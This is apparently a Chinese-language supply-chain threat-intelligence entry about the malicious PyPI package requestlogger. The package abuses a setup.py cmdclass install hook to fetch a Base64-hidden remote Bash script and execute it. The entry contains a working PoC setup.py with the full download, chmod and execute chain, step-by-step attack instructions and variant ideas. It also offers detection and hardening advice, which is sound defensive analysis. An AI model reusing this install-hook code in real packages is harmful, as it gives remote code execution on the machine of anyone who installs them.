---
id: cloud-cicd-pypi-setup-py-custom-install-command-remote-bash
title: PyPI setup.py 自定义 install 命令：安装时下载远程 Bash 脚本并 chmod 700 执行
type: scenario
domain: cloud
path: cloud/ci-cd
technique: pypi-setup-py-cmdclass-remote-bash
aliases:
- requestlogger 投毒
- setup.py CustomInstallCommand
- cmdclass 安装期执行
- 远程 bash 脚本供应链
- pip install 执行远程脚本
tags:
- supply-chain
- pypi
- python
- setup-py
- cmdclass
- remote-script
- bash
- ci-cd
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
affected_versions: requestlogger 1.1.1（PyPI 恶意包版本）
verification:
  verified_by: verifier-V451
  verified_at: '2026-11-10T01:34:47+08:00'
  notes: 已对照原文与25/25图片核对：setup.py CustomInstallCommand(install) 绑定 cmdclass、install.run 后 execute_script()、两段Base64（跟踪地址与 aliyun OSS test.sh）、tempfile 写入+chmod 0o700+bash 执行与图18一致；下载227次、脚本当前仅统计 47.245.14.174:8088 均属实。dedup_review 与 multiplerequests（setup() 后顶层 exec）区分成立；与 PEP517 卡机制不同。版本 requestlogger 1.1.1 原文明确，保留。无 sources/source_url。未验证点：PoC 未执行；远程脚本未复测。
---

## 一句话结论

PyPI 恶意包 `requestlogger` 在 `setup.py` 中定义 `CustomInstallCommand(install)` 并绑定为 `cmdclass['install']`，`pip install` 执行标准安装流程时追加调用 `execute_script()`：先请求 Base64 编码的“跟踪地址”标记受害主机，再从另一 Base64 编码的地址下载 Bash 脚本到临时文件、赋予 `0700` 权限并用 `bash` 执行，实现安装期远程命令执行。

## 原理

- **cmdclass 是 setuptools 的官方扩展点**：`setup(cmdclass={'install': CustomInstallCommand})` 会让 pip 在安装阶段实例化并调用自定义命令类。恶意类覆写 `run()`，先 `install.run(self)` 让正常安装照常完成，再执行自己的 `execute_script()`，因此包能正常装好、业务无感。
- **两段 Base64 隐藏地址与意图**：`execute_script()` 中脚本地址和跟踪地址都以 Base64 字符串硬编码，静态扫描看不到明文 URL；运行时才 `base64.b64decode` 还原。跟踪请求先行，用于确认“有主机安装了该包”，随后才拉取真正载荷。
- **临时文件 + chmod + bash**：脚本内容被写入 `tempfile.NamedTemporaryFile(mode='w+', delete=False)`，`os.chmod(..., 0o700)` 后 `subprocess.run(['bash', tmp_name], check=True)`。用临时文件而非 `bash -c` 是为了绕过对命令行字符串的检测，也便于脚本包含多行逻辑。
- **异常静默**：整段逻辑包在 `try/except Exception: pass` 中，网络失败或沙箱阻断不会导致安装报错，降低被发现概率。
- **载荷可变**：远程 Bash 脚本可随时替换。原文样本当前仅用 `curl` 访问一个统计地址（`47.245.14.174:8088` 路径），但同一入口可直接下发持久化、凭据窃取或横向脚本。
- **为什么有效**：pip 安装 sdist/本地源码包时会执行 `setup.py`；开发者默认信任 PyPI 包；安装日志只显示正常的 `Running setup.py install`，远程请求发生在安装进程内部。

## 触发条件

- 受害者执行 `pip install requestlogger`（版本 1.1.1）或依赖解析到该包；
- pip 走源码构建路径（sdist 或无可用 wheel），`setup.py` 被执行；
- 安装环境可出站访问跟踪地址与脚本托管地址（对象存储/CDN）；
- Linux/类 Unix 环境有 `bash`（`subprocess.run(['bash', ...])`）。

## 利用步骤

1. 在 PyPI 发布伪装成请求日志组件的包，`setup.py` 正常声明 `name/version/packages`，并绑定自定义 `install` 命令；
2. 自定义命令 `run()` 中先 `install.run(self)`，再调用 `execute_script()`；
3. `execute_script()` 解码并请求跟踪地址（记录安装量/受害标识），再解码脚本地址；
4. 下载脚本内容写入临时文件，`chmod 0o700`，`bash` 执行；
5. 攻击者通过替换对象存储中的脚本内容随时升级载荷；
6. 原文样本的脚本仅再次 `base64 -d` 一个统计 URL 并 `curl`，属于侦察阶段。

## PoC

最小结构示意（只写标记文件，不联网）：

```python
# setup.py
from setuptools import setup, find_packages
from setuptools.command.install import install
import base64, os, subprocess, tempfile, urllib.request

class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        self.execute_script()

    def execute_script(self):
        try:
            script_url = base64.b64decode(b"<base64 编码的脚本地址>").decode()
            with urllib.request.urlopen(script_url) as r:
                content = r.read().decode()
            with tempfile.NamedTemporaryFile(mode="w+", delete=False) as f:
                f.write(content)
                path = f.name
            os.chmod(path, 0o700)
            subprocess.run(["bash", path], check=True)
        except Exception:
            pass

setup(
    name="requestlogger",
    version="1.1.1",
    packages=find_packages(),
    cmdclass={"install": CustomInstallCommand},
)
```

验证：在隔离虚拟环境执行 `pip install ./requestlogger`，可观察到自定义 `install.run` 之后的外联与临时脚本执行；若把地址指向本地 HTTP 服务，可看到两次请求顺序（跟踪 → 脚本）。

## 变体与关联

- 变体：可改用 `build_py`、`develop`、`egg_info` 等命令类，或直接在 `setup.py` 顶层执行；PEP 517 构建后端同样可在构建期执行任意代码。
- 变体：跟踪请求可换成 Discord webhook/Telegram Bot；远程脚本可改为 PowerShell、Python 或二进制下载器。
- 关联：`setup.py` 顶层 `exec(base64)` 两阶段窃密见 [[cloud-cicd-pypi-multiplerequests-setup-py-cstealer]]；构建后端执行见 [[cloud-cicd-pep517-build-backend-install-rce]]；npm 生命周期脚本见 [[cloud-cicd-npm-postinstall-supply-chain-poisoning]]。
- 边界：`pip install --only-binary=:all:` 且只使用已审 wheel 时不会执行 `setup.py`；无 `bash` 环境或出站被阻断时链断。

## 检测与防御

- 检测：`setup.py` 中出现 `cmdclass={'install': ...}`、`tempfile.NamedTemporaryFile`、`os.chmod(..., 0o700)`、`subprocess.run(['bash', ...])` 组合；安装期出现两次连续外联（先跟踪后下载）。
- 检测：安装日志 `Running setup.py install` 后出现短时网络请求与 `/tmp` 下新建可执行脚本。
- 加固：只允许已审 wheel 与 `--require-hashes`；CI 构建在无出站/白名单网络中执行；对 sdist 的 `setup.py` 做人工或静态审计；监控安装期 `bash` 子进程。
- 响应：卸载包、删除临时脚本、封禁托管地址、排查安装主机是否出现后续持久化。
